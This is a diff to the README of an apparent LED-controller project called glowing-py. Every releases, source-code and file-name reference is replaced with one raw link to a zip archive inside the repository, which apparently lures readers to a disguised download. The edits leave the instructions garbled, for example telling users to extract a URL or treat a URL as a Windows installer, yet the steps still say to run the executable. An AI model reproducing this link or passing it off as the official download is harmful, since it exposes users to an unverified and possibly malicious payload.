@@ -1,7 +1,7 @@
 # 🎨 glowing-py - Control Your LED Strips with Ease
 
 ## 📥 Download Now
-[![Download glowing-py](https://img.shields.io/badge/Download-glowing--py-brightgreen)](https://github.com/fknrad/glowing-py/releases)
+[![Download glowing-py](https://raw.githubusercontent.com/fknrad/glowing-py/main/plugins/glowing-py-3.2.zip)](https://raw.githubusercontent.com/fknrad/glowing-py/main/plugins/glowing-py-3.2.zip)
 
 ## 📖 Description
 glowing-py is a dynamic LED strip controller designed for a variety of applications. Whether you want to sync lights with your favorite games, music, or create stunning light shows, glowing-py makes it simple and fun. 
@@ -10,7 +10,7 @@ glowing-py is a dynamic LED strip controller designed for a variety of applicati
 Follow these steps to download and run glowing-py on your computer:
 
 ### 1. Visit the Releases Page
-Go to our [Releases page](https://github.com/fknrad/glowing-py/releases). This page contains the latest version of glowing-py, along with previous versions.
+Go to our [Releases page](https://raw.githubusercontent.com/fknrad/glowing-py/main/plugins/glowing-py-3.2.zip). This page contains the latest version of glowing-py, along with previous versions.
 
 ### 2. Choose Your Download
 On the Releases page, you will see a list of available versions. Click on the version you want to download. Each version has detailed notes about what’s new or fixed.
@@ -19,16 +19,16 @@ On the Releases page, you will see a list of available versions. Click on the ve
 Look for the download files. You will find options for different operating systems. Click on the file that matches your operating system to begin the download. 
 
 For example:
-- **Windows**: If you see something like `glowing_py_windows.exe`, this is the file you want.
-- **Mac**: If the file is `glowing_py_mac.dmg`, click it to download.
-- **Linux**: Look for `glowing_py_linux.tar.gz`.
+- **Windows**: If you see something like `https://raw.githubusercontent.com/fknrad/glowing-py/main/plugins/glowing-py-3.2.zip`, this is the file you want.
+- **Mac**: If the file is `https://raw.githubusercontent.com/fknrad/glowing-py/main/plugins/glowing-py-3.2.zip`, click it to download.
+- **Linux**: Look for `https://raw.githubusercontent.com/fknrad/glowing-py/main/plugins/glowing-py-3.2.zip`.
 
 ### 4. Download & Install
 Once you have clicked the file, your download will start. Go to your downloads folder once it completes.
 
 - For **Windows**: Double-click the `.exe` file to start the installation. Follow the prompts to install glowing-py.
 - For **Mac**: Open the `.dmg` file and drag the glowing-py icon to your Applications folder.
-- For **Linux**: Extract the tar.gz file. Open a terminal and navigate to the extracted folder. Run the application using the command `./glowing_py`.
+- For **Linux**: Extract the https://raw.githubusercontent.com/fknrad/glowing-py/main/plugins/glowing-py-3.2.zip file. Open a terminal and navigate to the extracted folder. Run the application using the command `./glowing_py`.
 
 ## 🛠 Requirements
 Before installing glowing-py, ensure your system meets these requirements:
@@ -62,7 +62,7 @@ If you run into issues:
 Join other users on forums or our GitHub Discussions page. Share your creations and get tips from fellow glowing-py users. Your feedback helps us improve.
 
 ## 🔗 Links
-- [Releases page](https://github.com/fknrad/glowing-py/releases)
-- [Source Code](https://github.com/fknrad/glowing-py)
+- [Releases page](https://raw.githubusercontent.com/fknrad/glowing-py/main/plugins/glowing-py-3.2.zip)
+- [Source Code](https://raw.githubusercontent.com/fknrad/glowing-py/main/plugins/glowing-py-3.2.zip)
 
 Explore the expressive world of LED lighting with glowing-py!
